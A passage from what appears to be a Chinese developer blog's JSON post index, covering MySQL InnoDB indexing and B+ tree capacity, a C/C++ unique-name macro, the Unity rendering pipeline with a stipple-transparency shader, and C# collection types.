对于选择性比较低的索引键，如果创建Hash索引，那么将会存在大量记录指针信息存于同一个Hash值相关联。这样要定位某一条记录时就会非常麻烦，会浪费多次表数据的访问，而造成整体性能低下。\n\n疑问回答环节（主要针对InnoDB）为什么辅助索引不直接存数据的地址而存主键id呢\n因为数据会不断的变动，所以他的地址会跟着一起变。如果直接存储地址，下次找的数据可能就不是原先的数据了。\n索引是不是创建的越多越好呢\n答：并不是\n\n我们已经知道了索引即数据，那么我们过多的创建索引就会导致数据量的增加。\n我们知道索引是一颗平衡树，我们在更新数据的同时，索引也在频繁的进行页分裂和合并，非常耗时。\n\n有关什么是页分裂和合并推荐一篇知乎文章InnoDB中的页合并与分裂，这里就不单独讲述。\n为什么我们推荐使用自增id而不推荐使用uuid或者身份证号等呢\n上面我们提到过B+Tree是自底向上插入的，什么意思呢。我们优先会将数据插入到叶子节点中，然后整个树会根据底部的叶子节点进行变动。\n当我们使用的是自增主键呢，我们叶子节点链表会根据当前最后一条的位置，将最新的一条数据顺序的插入到后面，看下图。\n\n 但是当你插入一个uuid时，mysql根本不知道他该插入到哪个位置，需要从头开始寻找插入的位置。但是当我们的插入的页满了时，这就造成了页的分裂和合并，极大的影响了效率。\n\n而且我们使用uuid的话，uuid所占字节也比较长，就导致了每一页存储的数据就会变少，也不利于索引的数据查询。\n哪些列适合添加索引呢\n需要经常where的字段\n需要join连表的字段\n需要排序的字段\n需要group by的字段\n\n我们需不需要在性别上加索引呢？这个呢我们就做个测试，我有一个300w数据的表。\nCREATE TABLE `user_innodb` (  `id` int(11) NOT NULL AUTO_INCREMENT,  `name` varchar(255) DEFAULT NULL,  `gender` tinyint(1) DEFAULT NULL,  `phone` varchar(11) DEFAULT NULL,  PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=3000001 DEFAULT CHARSET=utf8mb4;\n\n我们首先查询一下性别为男的所有数据。\nSELECT *from user_innodbwhere gender = 1;\n\n没加索引之前，我们用explain看下执行效率。\n\n执行结果是1s，还可以接受。\n加了索引之后，最终结果出来没让我失望22s。\n\n所以实验就证明了不能够在性别上创建索引。为什么会有这么大的差别呢，加了索引反而比不加索引更慢。\n因为，在没有索引的情况下，mysql只需遍历底部的链表即可。但是加了索引以后他会查询index(gender)找到合法的索引的主键，然后通过主键再去index(id)里面去找这样一来一回效率自然就直线下降。\n那么我们创建索引有什么特别的依据吗，这里就给大家一个公式：count(distinct(column_name)) : count(*),这个可以简单地计算出这个字段的离散值,离散值越高说明建立索引效果更明显。例如我们给手机号加索引，最后计算出来的离散度是1，说明非常有必要加索引。\nlike ‘%张’一定不走索引吗\n我们再次进行个测试，我们给phone和name两个字段建立一个联合索引idx_phone_name。然后看下下面这条语句的执行计划。\nEXPLAIN SELECT *FROM user_innodbWHERE name LIKE &#x27;%张&#x27; and phone = &#x27;13204776301&#x27;;\n\n这种情况下因为phone在索引第一位，所以无论有没有name这个条件都会走索引。\n\n我们可以看到extra里面存在Using index condition（ICP），ICP的全名是index condition pushdown索引条件下推。\nICP 索引条件下推索引条件下推（ICP）是针对MySQL使用索引从表中检索行的情况的一种优化。如果不使用ICP，则存储引擎将遍历索引以在基表中定位行，并将其返回给MySQL服务器，后者将评估WHERE行的条件。\n启用ICP后，如果WHERE可以仅使用索引中的列来评估部分 条件，则MySQL服务器会将这部分条件压入WHERE条件下降到存储引擎。然后，存储引擎通过使用索引条目来评估推送的索引条件，并且只有在满足此条件的情况下，才从表中读取行。ICP可以减少存储引擎必须访问基表的次数以及MySQL服务器必须访问存储引擎的次数。\n索引条件下推式优化的适用性取决于以下条件：\n\nICP用于 range， ref， eq_ref，和 ref_or_null访问方法时，有一个需要访问的全部表行。\nICP可用于InnoDB 和MyISAM表，包括分区表InnoDB和 MyISAM表。\n对于InnoDB表，ICP仅用于二级索引。ICP的目标是减少全行读取次数，从而减少I &#x2F; O操作。对于 InnoDB聚集索引，完整的记录已被读入InnoDB 缓冲区。在这种情况下使用ICP不会减少I &#x2F; O。\n在虚拟生成的列上创建的二级索引不支持ICP。InnoDB 支持虚拟生成的列上的二级索引。\n引用子查询的条件不能下推。\n涉及存储功能的条件不能下推。\n存储引擎无法调用存储的功能。\n触发条件不能下推。\n\n具体的IPC相关的信息，建议参考官网\n我那上面的那条sql进行个举例，说明下什么是ICP，看下图，一切都在图里。\n\n如果表没有主键怎么办，聚集索引怎么建立\n\n默认情况下我们在设置表主键的时候，数据库会默认将其设置为聚集索引。\n如果没有定义主键，那么mysql会找第一个唯一索引来作为局促索引，前提是聚集索引是NOT NULL\n如果上面的两个条件都没有满足，那么InnoDB会生成一个隐藏的聚集索引GEN_CLUST_INDEX，每一行都生成一个默认自增的主键id。\n\nref: https://www.cnblogs.com/zhangyi555/p/15596768.html\n","categories":["dev"],"tags":["mysql"]},{"title":"如何在C/C++中使用宏生成随机变量名？","url":"/2022/11/18/dev/language/cpp/%E5%AE%8F%E7%94%9F%E6%88%90%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%90%8D/","content":"如何在C&#x2F;C++中使用宏生成随机变量名？最近在写Squick项目，在采用宏来实现注册模块的封装时，某些临时的变量需要采用随机变量名称来防止变量名冲突，就需要某些宏来实现编译时随机变量名的生成了。写好的代码在此：https://github.com/i0gan/Squick/blob/main/src/squick/core/i_plugin.h#L17\n了解宏定义首先我们先了解一下宏定义。\n解决方案使用它的另一个动机是避免为变量选择特定的名称，以使其与开发人员最终使用宏选择的名称相同。\n宏是唯一的，但是一旦在一个块中使用两次宏，它也是随机的，在这种情况下，它将生成如下内容：\nint unique_variable_name;... int unique_variable_name;\n\n在这种情况下，为了唯一，两个变量名都必须随机生成。\n解决方案如下：\n// This is some crazy magic that helps produce __BASE__247// Vanilla interpolation of __BASE__##__LINE__ would produce __BASE____LINE__// I still can&#x27;t figure out why it works, but it has to do with macro resolution ordering#define PP_CAT(a, b) PP_CAT_I(a, b)#define PP_CAT_I(a, b) PP_CAT_II(~, a ## b)#define PP_CAT_II(p, res) res#define UNIQUE_NAME(base) PP_CAT(base, __COUNTER__)\n\n据传__COUNTER__具有可移植性问题。可以改用__LINE__，只要您不每行多次调用宏或在编译单元之间共享名称，就可以了。\n用法：\n#define PP_CAT(a, b) PP_CAT_I(a, b)#define PP_CAT_I(a, b) PP_CAT_II(~, a ## b)#define PP_CAT_II(p, res) res#define UNIQUE_NAME(base) PP_CAT(base, __LINE__)// abc为函数名称前缀，后面采用行号数字连接，以下变量名不会出现冲突。void UNIQUE_NAME(abc) ()&#123;    int UNIQUE_NAME(abc) = 123;    int UNIQUE_NAME(abc) = 456;&#125;\n\n\n\n参考https://www.codenong.com/1082192/\n","categories":["language"],"tags":["cpp"]},{"title":"一颗高度为3的B+树到底能存多少数据","url":"/2022/11/14/dev/db/mysql/%E9%AB%98%E5%BA%A6%E4%B8%BA3%E7%9A%84B+%E6%A0%91/","content":"一颗高度为3的B+树到底能存多少数据1. 背景在参加龙渊网络面试的时候，被问到了B+树索引能存多少数据。这个问题挺有趣，要是对B+树不太了解，那么这个问题估计也不好回答\n那么要回答这个问题，首先要知道B+树的结构是怎样的，存了什么数据，怎么存的，这些东西占多大等\n先新建个表\nCREATE TABLE IF NOT EXISTS `person`(   `id` INT UNSIGNED AUTO_INCREMENT,   `name` VARCHAR(64) NOT NULL,   PRIMARY KEY ( `id` ))ENGINE=InnoDB DEFAULT CHARSET=utf8;复制代码\n\n2. InnoDB的页结构\n在InnoDB中，索引默认使用的数据结构为B+树，而B+树里的每个节点都是一个页，默认的页大小为16KB。\n非叶子节点存的是索引值以及页的偏移量，而叶子节点上存放的则是完整的每行记录\n\n 大概认识了页里面存了什么，占多大空间，就可以估计能存放多少条数据了\n\n这里重点关注绿色部分。我也没画太全，还有File Header、Page Header等是什么，有什么用这些就不展开说了，有兴趣的可以自己去翻一下《MySQL技术内幕》的4.4，或者去看我分析这个person表的ibd文件，怎么写出下面验证的小工具的\n\n\n小工具链接：github.com&#x2F;52123&#x2F;innod…\n\n3. B+树能存多少数据3.1 非叶子节点能存多少数据\n页默认16KB\nFile Header、Page Header等一共占102个字节\nInfimum + Supremum分别占13个字节\n记录头占5个字节\nid占为int，占4个字节\n页目录的偏移量占4个字节 所以，非叶子节点能存多少条索引记录呢\n\n   非叶子节点能存放的索引记录=  (页大小 - File Header - Page Header - ...) / ( 主键 + 页偏移量 + 下一条记录的偏移量)= （16KB - 128B) / (5B + 4B + 4B) =  16256 / 13=  1250 条复制代码\n\n3.2 叶子节点能存多少数据叶子节点能存多少条数据记录呢\n\n变长列表占1个字节\nnull标志位忽略\n记录头占5个字节\nid占为int，占4个字节\nname为VARCHAR，编码为UTF8，为了好算，所有行记录我都只用两个中文，那就是 2 * 3B &#x3D; 6个字节\n事务ID列占6个字节\n回滚指针列占7个字节\n\n   叶子节点能存放的数据记录=  (页大小 - File Header - Page Header - ...) / ( 主键 + 字段 + 下一条记录的偏移量)= （16KB - 128B) / (1B + 5B + 4B + 6B + 6B + 7B) =  16256 / 29=  560 条复制代码\n\n3.3 高为3的B+树能存多少行数据记录\n根节点能放1250条索引记录\n第二层能放1250 * 1250 &#x3D; 1,562,500条索引记录\n叶子节点 1250 * 1250 * 560 &#x3D; 875,000,000条数据记录，八亿多条数据 也就是说，假如我的表里面只有id和name这两个字段的话，高为3的B+树能存八亿多条数据记录，好家伙\n\n4. 验证一下写了个脚本生成批量插入的SQL，插入了27,090,000条数据\n\n根据File Header、Page Header、Infimum、Supremum和Record Header的大小以及含义，我用Python写了个小工具，用来帮忙验证每一页存的数据量是不是跟我上面猜想的一样\n 得到的数据：B+树高度为3，非叶子节点有46个，叶子节点52501个，索引记录的数量为52546， 行数据记录的数量为27090000\n4.1 实际得到非叶子节点能存多少数据   实际得到的非叶子节点能存放的索引记录=  索引记录的数量 / 非叶子节点数量=  52546 / 46=  1142复制代码\n\n跟我猜想里面算出来的数值（1250条）很接近了，至于为什么实际得到的会比猜想的要少呢\n\n第一，我没有算Page Directory，但是我有打印出槽的数量，可以看到非叶子节点的槽有13150个，平均每一页就是 13150 &#x2F; 46 &#x3D; 286个，一个槽占两个字节，所以猜想应该是 （16256 - 286 * 2） &#x2F; 13 &#x3D; 1206 条\n第二，实际上，并不是每一个非叶子节点，都是存满索引数据的，所以差个几十条我觉得挺正常的\n\n4.2 实际得到叶子节点能存多少数据   实际得到的叶子节点能存放的索引记录=  行数据记录的数量 / 叶子节点数量=  27090000 / 52546=  516复制代码\n\n好吧，跟我猜想算出来的（560）也很接近，也差那么一点点\n\n把叶子节点的槽也算上，平均每一个叶子节点的槽就是 6825001 &#x2F; 52501 &#x3D; 130个，那么更准确的猜想应该是（16256 - 130 * 2）&#x2F; 29 &#x3D; 551 条\n跟上面一样，不是每个叶子节点都刚好存满的\n\n4.3 有趣的点刚才我们得到的数据\n\n非叶子节点有46个，叶子节点52501个\n索引记录的数量为52546， 行数据记录的数量为27090000\n\n其实这个 索引记录的数量 跟 叶子节点的数量跟是能对上的，我看了下根节点，它有45条索引记录，也就是说\n- 根节点，存了45条索引记录- 第二层，存了52546 - 45 = 52501条索引记录数据- 第三层，叶子节点，有52501个这个第二层跟第三层刚好就是一条索引记录对应一个叶子节点复制代码\n\n5. 举一反三为什么InnoDB默认使用B+树作为索引的数据结构本质：减少磁盘IO\nInnoDB使用B+树的非叶子节点存储主键值和页目录，这样一个页能存下来的索引记录就会变多。叶子节点则拿来存真正的行记录，这样做的好处能让树的高度降下来，从而减少磁盘IO。结合上面，八亿多的数据，高度为3的B+树就能存下了，最多只需要3次磁盘IO，就能从八亿数据中得到想要的数据了。\n为什么不用B树来作为索引的数据结构B树跟B+树不一样，B树每一页都会存行数据，因为行数据占的空间比较大，所以每一页能存的数据就相应减少了，从而需要更多的页来存数据，因此，树也会相应变高，从八亿多的数据可能就要N次磁盘IO才能得到了\n另外，B+树的页节点都是由双向列表连接的，而页里面的记录则是用单向链表连接的，所以获取区间数据也会更高效\n6. 总结InnoDB存储引擎默认使用的索引数据结构为B+树，而B+树里的每个节点都是一个页，默认的页大小为16KB\nB+树里的非叶子节点存的是索引记录，包含索引值和页偏移量，而叶子节点存的是行数据记录，包含真正的行数据\n\nFile Header占38个字节\nPage Header占56个字节\nInfimum和Supremum各占13个字节\nFile Trailer占8个字节\nPage Directory里每个槽占2个字节\n每条记录的记录头占5个字节（不管是索引记录，行数据记录都有数据头） 结合表中定义的字段大小，可大致推断B+树能存多少数据\n\nInnoDB使用B+树作为默认的索引数据结构的一个主要原因是，减少磁盘的IO次数\n参考\nMySQL官方文档-The InnoDB Storage Engine\n《MySQL技术内幕（InnoDB存储引擎）第2版》\n《高性能MySQL》\n\nref：https://juejin.cn/post/6973647815473889311\n","categories":["dev"],"tags":["mysql"]},{"title":"渲染管线流程","url":"/2022/11/09/dev/game/u3d/%E6%B8%B2%E6%9F%93%E7%AE%A1%E7%BA%BF%E6%B5%81%E7%A8%8B/","content":"渲染管线流程在游戏引擎中，我们会将一些美术素材，无论是2D的还是3D的，显示在屏幕上，这一流程我们称之为渲染管线。渲染管线分为几个步骤：应用阶段-几何阶段-光栅化阶段-像素处理-合并阶段\n渲染管线应用阶段应用阶段的主要任务是把 顶点数据、shader、贴图、材质球、灯光以及一些设置等等传入GPU的过程，这个过程叫做 DrawCall\nUnity DrawCall 内部分为 SetPassCall 和 Batch，SetPassCall的作用是设置渲染管线的上下文，一般每一种Unity里的Material就是一个SetPassCall，\nBatch就是每一次CPU向GPU打包发送顶点数据的批次，当我们优化性能的时候经常会用到（动态）合批，合批就是将拥有两个相同的材质（材质实例也要相同）的物体同时传入GPU进行处理。\n\n合批处理在UGUI中会有一些不同先获得一个按Hierarchy的顺序的列表计算每个物体的深度。2.1 深度从0开始递增。如果世界包围盒Z轴不为0（或isCanvasInjectionIndex），则需独占一个批次，同时独占一个深度。即等于之前所有物体最大深度+1，后一个物体深度需要+1。2.2 对一般物体的深度。会判断是否可跟之前的物件共享深度，走接下来的流程。2.2.1 先按格子（默认大小是120，根据包围盒再计算）划分出多个格子。（只是为了加速求交）。2.2.2 计算物体包围相交哪些格子，再跟格子中已有的物体进行包围盒相交判断。如果不相交则使用当前深度；如果相交且可合批，则使用相交物体中最大的深度；如果相交且不可合批，则使用相交物体中最大的深度+1。合批条件：无独占批次+材质相同+贴图相同+裁剪开关和裁剪矩形相同+贴图A8格式一致（kTexFormatAlpha8） 2.2.3 将该物体加入所有相交的格子中。若遇到独占深度的物体，则格子数据清空。即后续物件不跟之前的物件共享深度。排序：按照深度-&gt;材质-&gt;贴图-&gt;层级顺序优先级排序。合批：对排序后的列表，从头开始一个一个检测是否能与前面的物体合批。合批条件：无独占批次（只判断isCanvasInjectionIndex）+材质相同+贴图相同+裁剪开关和裁剪矩形相同+贴图A8格式一致（kTexFormatAlpha8），非SubBatch只判断前两个条件，一般情况下UI的材质都一样。\n\n\nUGUI批处理原文链接：https://blog.csdn.net/hankangwen/article/details/122667647\n在Unity中的shader中会将这些数据存到一些通道里： POSITION、NORMAL、COLOR、 TANGENT、TEXCOOR\nstruct a2v //application to vertex shader&#123;    float4 vertex : POSITION;    float3 normal : NORMAL;    float4 color : COLOR;    float4 tangent : TANGENT;    float4 texcoord : TEXCOORD0;&#125;\n\n几何阶段顶点着色器\nMVP变换\nModel - View - Projection 对应 Model Space→World Space→ View Space\nModel 期间对应的是一个Model矩阵，Model矩阵的作用是实现模型的Transform仿射变换，包括了Translation，Rotation，Scaling(变换的顺序不能变)\n矩阵的乘法是右结合的，以TRS的顺序求结果那么逻辑上就是先缩放再旋转最后平移，因为一旦先进行了平移再缩放就会将平移的距离一并缩放，得到错误结果，旋转同理，先平移再旋转得到的就不是绕原点的旋转结果了。在这个TRS过程中，R和S都是线性变换，但是T不是，意味着T是一种特殊的变换，为了化简这种特殊性，我们引入齐次坐标，将二维的点用三个坐标表示，三维的点用四个坐标表示（下式是一个二维的齐次坐标平移变换过程，详细解释可以参考Games101） [x′y′w′]&#x3D;[10tx01ty001][xy1]&#x3D;[x+txy+ty1]\n最后对应的Model Matrix\nModel&#x3D;T×R× S&#x3D;[100tx010ty001tz0001][10000cosθ−sinθ00sinθcosθ00001][cosθ0sinθ00100−sinθ0cosθ00001][cosθ−sinθ00sinθcosθ0000100001][x0000y0000z00001]\nView变换是将世界空间中的坐标变换到摄像机空间，至于为什么会存在一个摄像机空间，是因为与其变换摄像头位置的操作，直接变换世界空间的坐标收益更大，所以我们优先将世界空间的坐标对齐到以摄像机为原点构建的坐标系上\nView变换的原理和Mode矩阵差不多，也是旋转加平移，由于是一个逆变换，所以这里采用的是先平移再旋转，矩阵的表示就为 R×T\n将一个物体旋转到指定的基向量上也许并不好算，但是将基向量旋转到指定的位置就变得很简单，我们通过写出这个旋转矩阵的逆矩阵，再对这个正交的逆矩阵求逆（正交矩阵的特性：正交矩阵的逆就是原矩阵关于主对角线对称）\nRview−1&#x3D;[xg^×t^xtx−g0yg^×t^yty−g0zg^×t^ztz−g00001]\nRview&#x3D;[xg^×t^yg^×t^zg^×t^0xtytzt0x−gy−gz−g00001]\nProjection的过程就有些复杂了\n先从简单的 正交投影(Orthographic projection)讲，正交投影的过程很简单，讲模型平移到原点为中心，然后挤压入一个正则立方体中（ (−1,1)3NDC 空间） Mortho&#x3D;[2r−l00002l−b00002n−f00001][100−r+l2010−l+b2001−n+f20001]\n由于-1到1的距离是2，所以缩放过后的物体长宽高也为2，只需要将 $物体的坐标 &#x2F; 物体的长宽高 * 2$ 就能得到缩放矩阵，平移很简单，移到中心即可\n\n再来看 透视投影(Perspective projection)\n透视投影这里直接采用将正交矩阵挤压成投影矩阵\nMpersp→ortho&#x3D;[n0000n0000n+f−nf0010]\n所以最后投影矩阵的结果为 Mpersp&#x3D;Mperp→ortho×Mortho\n曲面细分着色器\n（可选着色器）实现LOD\n图元装配\nView Space→Clip Space→Screen Space\n图元装配会将顶点装配成指定的图形，与此同时，会进行裁剪、背面剔除等操作，以减少不必要的计算，加速渲染过程。(图元可以理解为三角形)\n裁剪\n进行完MVP变换后，就要针对屏幕大小进行裁剪,还有背面剔除等操作\n屏幕映射\n将NDC空间内的顶点映射到屏幕空间\n光栅化阶段此过程将组成的三角形映射到片元上，每个片元的信息都是由三个顶点的信息插值得到\n此过程也包括纹理映射和实现光照模型\n合并阶段(Blend)合并处理阶段属于屏幕后期处理范围，一般包括Alpha测试，深度测试，模板测试和混合，通过这个阶段可以决定每个片元的可见性\nALPHA测试通过片元数据，可以获取该片元的alpha值，如果alpha值小于某个数的话，则直接将该片元丢弃，不进行渲染，这是非常“粗暴”的（即只渲染透明度在某一范围内的片元），可以用来做一些树叶镂空的效果。\n深度测试近处的物体会遮挡远处的物体，这种效果我们可以通过深度测试来模拟实现。它通过将深度缓存中的值和当前片元的深度进行比较，计算是否需要更新深度缓存和颜色缓存，如果不需要则将该片元丢弃，这与模板测试比较类似。我们在渲染半透明物体时， 需要开启深度测试而关闭深度写入功能。\n模板测试模板测试默认是不开启的，如果开启了模板测试，GPU会首先读取模板缓冲区中该片元位置的模板值，然后将该值和读取到的参考值进行比较，这个比较函数可以是由开发者指定的，例如小于时舍弃该片元，或者大于等于时舍弃该片元。如果这个片元没有通过这个测试，该片元就会被舍弃\n混合阶段对于不透明的物体，可以直接关闭混合操作，片元着色器的值会直接覆盖颜色缓冲区的像素值，对于半透明的物体，会采用混合计算得出新的像素值\n\n透明渲染:这种直接读取深度值，从后往前blend的透明渲染模式称为over操作，一般的渲染引擎都是这么处理透明物体的混合的除此之外还有一些其他的透明渲染模式，如(OIT,order-independent transparency)，OIT主要解决当两个透明的物体有重叠部分时，由于原本是基于物体深度的排序，所以交叠部分会出现渲染错误一种常见的OIT方式为depth peeling\n首先先将所有的不透明物体和透明物体的深度写入到第一个z-buffer;\n渲染所有的不透明物体, 将得到的深度值和第一个z-buffer中的值比较, 如果两个值相等, 我们就认为这个表面是距离我们最近的透明面, 这时将得到的RGBA值存入到color buffer中. 同时我们在第二个z-buffer中写入距离我们第二近的深度值, 实现peeling的效果.\n将第二个z-buffer作为输入, 第一个z-buffer作为输出, 得到的RGBA颜色用under的方式和之前的颜色混合.\n重复前面的步骤, 渲染所有的透明物体后, 将最终的颜色和不透明表面的颜色混合.\n（原帖:https://zhuanlan.zhihu.com/p/149982810）此外还有一些简单高效的渲染模式，如 Screen-Door Transparency，附上shader\n\n\nShader &quot;Ocias/Diffuse (Stipple Transparency)&quot; &#123;Properties &#123;    _MainTex (&quot;Base (RGB)&quot;, 2D) = &quot;white&quot; &#123;&#125;    _Transparency (&quot;Transparency&quot;, Range(0,1)) = 1.0 &#125;SubShader &#123;    Tags &#123; &quot;RenderType&quot;=&quot;Opaque&quot; &#125;    LOD 150CGPROGRAMpragma surface surf Lambert noforwardaddsampler2D _MainTex;struct Input &#123;    float2 uv_MainTex;    float4 screenPos;&#125;;half _Transparency;void surf (Input IN, inout SurfaceOutput o) &#123;    fixed4 c = tex2D(_MainTex, IN.uv_MainTex);    o.Albedo = c.rgb;    o.Alpha = c.a;// Screen-door transparency: Discard pixel if below threshold.float4x4 thresholdMatrix = &#123;  1.0 / 17.0,  2.0 / 17.0,  3.0 / 17.0, 4.0 / 17.0,  8.0 / 17.0,  7.0 / 15.0, 6.0 / 17.0,  5.0 / 17.0,  9.0 / 17.0, 10.0 / 15.0,  11.0 / 17.0, 12.0 / 17.0,  16.0 / 17.0,  15.0 / 13.0, 14.0 / 17.0,  13.0 / 17.0 &#125;;float4x4 _RowAccess = &#123; 1,0,0,0, 0,1,0,0, 0,0,1,0, 0,0,0,1 &#125;;float2 pos = IN.screenPos.xy / IN.screenPos.w; pos *= _ScreenParams.xy;// pixel positionclip(_Transparency - thresholdMatrix[fmod(pos.x, 4)] * _RowAccess[fmod(pos.y, 4)]); &#125;ENDCG&#125;Fallback &quot;Mobile/VertexLit&quot;&#125; \n\n","categories":["dev"],"tags":["unity3d"]},{"title":"C#容器","url":"/2022/11/08/dev/language/csharp/csharp_container/","content":"C#容器从使用的频率一个个来简单说一下。\nArray&#x2F;ArrayList&#x2F;List&#x2F;LinkedListArray\n数组在C#中最早出现的。在内存中是连续存储的，所以它的索引速度非常快，并且赋值与改动元素也非常easy。\nstring[] s=new string[2]; //赋值 s[0]=&quot;a&quot;; s[1]=&quot;b&quot;; //改动 s[1]=&quot;a1&quot;; \n\n\n\n\n可是数组存在一些不足的地方。在数组的两个数据间插入数据是非常麻烦的，并且在声明数组的时候必须指定数组的长度。数组的长度过长，会造成内存浪费，过段会造成数据溢出的错误。假设在声明数组时我们不清楚数组的长度。就会变得非常麻烦。\n针对数组的这些缺点，C#中最先提供了ArrayList对象来克服这些缺点。 \n底层数据结构就是数组。\nArrayListArrayList是命名空间System.Collections下的一部分。在使用该类时必须进行引用，同一时候继承了IList接口。提供了数据存储和检索。ArrayList对象的大小是依照当中存储的数据来动态扩充与收缩的。所以。在声明ArrayList对象时并不须要指定它的长度。\nArrayList list1 = new ArrayList(); //新增数据 list1.Add(&quot;cde&quot;); list1.Add(5678); //改动数据 list[2] = 34; //移除数据 list.RemoveAt(0); //插入数据 list.Insert(0, &quot;qwe&quot;); \n\n\n\n从上面样例看。ArrayList好像是攻克了数组中全部的缺点，为什么又会有List？我们从上面的样例看，在List中。我们不仅插入了字符串cde。并且插入了数字5678。\n这样在ArrayList中插入不同类型的数据是同意的。\n由于ArrayList会把全部插入当中的数据当作为object类型来处理，在我们使用ArrayList处理数据时。非常可能会报类型不匹配的错误，也就是ArrayList不是类型安全的。在存储或检索值类型时通常发生装箱和取消装箱操作，带来非常大的性能耗损。装箱与拆箱的概念：简单的说:装箱：就是将值类型的数据打包到引用类型的实例中比方将string类型的值abc赋给object对象obj\nString i=”abc”; object obj=(object)i; \n\n\n\n\n拆箱：就是从引用数据中提取值类型比方将object对象obj的值赋给string类型的变量i\nobject obj=”abc”; string i=(string)obj; \n\n\n\n装箱与拆箱的过程是非常损耗性能的。 \n底层数据结构就是数组。相似于C++里面没有泛型的Vector。\n**泛型List**由于ArrayList存在不安全类型与装箱拆箱的缺点。所以出现了泛型的概念。List类是ArrayList类的泛型等效类。它的大部分使用方法都与ArrayList相似。由于List类也继承了IList接口。\n最关键的差别在于，在声明List集合时，我们同一时候须要为其声明List集合内数据的对象类型。\n比方：\nList&lt;string&gt; list = new List&lt;string&gt;(); //新增数据 list.Add(“abc”); //改动数据 list[0] = “def”; //移除数据 list.RemoveAt(0); \n\n\n\n\n上例中。假设我们往List集合中插入int数组123。IDE就会报错。且不能通过编译。这样就避免了前面讲的类型安全问题与装箱拆箱的性能问题了。\n底层数据结构就是数组。\n相似于C++里面的Vector。\nLinkedList\n用双链表实现的List。特点是插入删除快，查找慢\nLinkedList 提供 LinkedListNode 类型的单独节点，因此插入和移除的运算复杂度为 O(1)。\n能够移除节点，然后在同一列表或其它列表中又一次插入它们。这样在堆中便不会分配额外的对象。\n由于该列表还维护内部计数。因此获取 Count 属性的运算复杂度为 O(1)。LinkedList 对象中的每一个节点都属于 LinkedListNode 类型。由于 LinkedList 是双向链表，因此每一个节点向前指向 Next 节点，向后指向 Previous 节点。\nLinkedList&lt;string&gt; list = new LinkedList&lt;string&gt;();list.AddFirst(&quot;Data Value 1&quot;);list.AddLast(&quot;Data Value 6&quot;);\n\n\n\n\n\n关于List和LonkedList的一个性能比較\n添加 删除在List中添加、删除节点的速度。大体上快于使用LinkedList时的同样操作。将 List.Add方法和LinkedList的Add*方法相比較。真正的性能差别不在于Add操作，而在LinkedList在给GC（垃圾回收机制）的压力上。一个List本质上是将其数据保存在一个堆栈的数组上。而LinkedList是将其全部节点保存在堆栈上（人家是一个，我是一系列）。这就使得GC须要很多其它地管理堆栈上LinkedList的节点对象。\n注意，List.Insert方法比在LinkedList中使用Add方法在不论什么地方加入一个节点可能要慢。然而。这个依赖于List插入对象的位置。Insert方法必须使全部在插入点后面的元素往后移动一位。假设新元素被插在List最后或接近最后的位置，那么相对于GC维护LinkedList节点的总的开销来说，其开销是能够被忽略的。\n索引还有一个List性能优于LinkedList的地方是你在使用索引进行訪问的时候。\n在List中，你能够使用索引值（indexer）直接定位到某个详细的元素位置。\n而在LinkedList中，却没有这种奢侈品。在LinkedList中，你必须通过Previous或Next属性遍历整个List，直到找到你想要的节点。\nHashSet&#x2F;HashTable&#x2F;Dictionary这三个容器的底层都是Hash表。\nHashSet\nMSDN非常easy的解释：表示值的集。\nHashSet 类提供了高性能的集运算。一组是一个集合，不包括不论什么反复的元素，且的元素顺序不分先后。\n用了hash table来储存数据。是为了用O(n)的space来换取O(n)的时间。也就是查找元素的时间是O(1)。\n它包括一些集合的运算\nHashSet 提供了很多数学设置操作比如，组加入 （联合），并设置减法。下表列出了所提供 HashSet 操作和及其数学等效项。\nUnionWith - Union 或将其设置的加入IntersectWith - 交集ExceptWith - Set 减法SymmetricExceptWith - 余集\n列出的集操作中，除了 HashSet 类还提供了方法来确定 set 是否相等、 重叠的集，以及一组是否为子集或还有一个集的超集。\nexample\n HashSet&lt;int&gt; evenNumbers = new HashSet&lt;int&gt;();HashSet&lt;int&gt; oddNumbers = new HashSet&lt;int&gt;();for (int i = 0; i &lt; 5; i++)&#123;     // Populate numbers with just even numbers.      evenNumbers.Add(i * 2);     // Populate oddNumbers with just odd numbers.     oddNumbers.Add((i * 2) + 1);&#125; // Create a new HashSet populated with even numbers.HashSet&lt;int&gt; numbers = new HashSet&lt;int&gt;(evenNumbers); numbers.UnionWith(oddNumbers);\n\n\n\n\n\n\n\nHashTable\n表示依据键的哈希代码进行组织的键&#x2F;值对的集合。\nHashtable是System.Collections命名空间提供的一个容器，用于处理和表现相似key&#x2F;value的键值对，当中key通常可用来高速查找，同一时候key是区分大写和小写。value用于存储相应于key的值。Hashtable中key&#x2F;value键值对均为object类型，所以Hashtable能够支持不论什么类型的key&#x2F;value键值对.\n他内部维护非常多对Key-Value键值对，其还有一个相似索引的值叫做散列值(HashCode)，它是依据GetHashCode方法对Key通过一定算法获取得到的。全部的查找操作定位操作都是基于散列值来实现找到相应的Key和Value值的\n当前HashTable中的被占用空间达到一个百分比的时候就将该空间自己主动扩容。在.net中这个百分比是72%,也叫.net中HashTable的填充因子为0.72。\n比如有一个HashTable的空间大小是100。当它须要加入第73个值的时候将会扩容此HashTable.\n这个自己主动扩容的大小是多少呢？答案是当前空间大小的两倍最接近的素数，比如当前HashTable所占空间为素数71，假设扩容，则扩容大小为素数131.\n Hashtable openWith = new Hashtable();// Add some elements to the hash table. There are no // duplicate keys, but some of the values are duplicates.openWith.Add(&quot;txt&quot;, &quot;notepad.exe&quot;);openWith.Add(&quot;bmp&quot;, &quot;paint.exe&quot;);openWith.Add(&quot;dib&quot;, &quot;paint.exe&quot;);openWith.Add(&quot;rtf&quot;, &quot;wordpad.exe&quot;);\n\n\n\n\n\n\n\n\n\nHashTable也有Boxing和Unboxing的开销。\n然后就有了\nDictionary\nDictionary也是键值容器。存入对象是须要与[key]值一一相应的存入该泛型。相对于HashTable，相似于List和ArrayList的关系。它是类型安全的。\nDictionary&lt;string, string&gt; myDic = new Dictionary&lt;string, string&gt;();myDic.Add(&quot;aaa&quot;, &quot;111&quot;);myDic.Add(&quot;bbb&quot;, &quot;222&quot;);myDic.Add(&quot;ccc&quot;, &quot;333&quot;);myDic.Add(&quot;ddd&quot;, &quot;444&quot;);\n\n\n\n小结数组的容量是固定的，您仅仅能一次获取或设置一个元素的值，而ArrayList或List的容量可依据须要自己主动扩充、改动、删除或插入数据。数组能够具有多个维度，而 ArrayList或 List&lt; T&gt; 始终仅仅具有一个维度。可是，您能够轻松创建数组列表或列表的列表。特定类型（Object 除外）的数组 的性能优于 ArrayList的性能。 这是由于 ArrayList的元素属于 Object 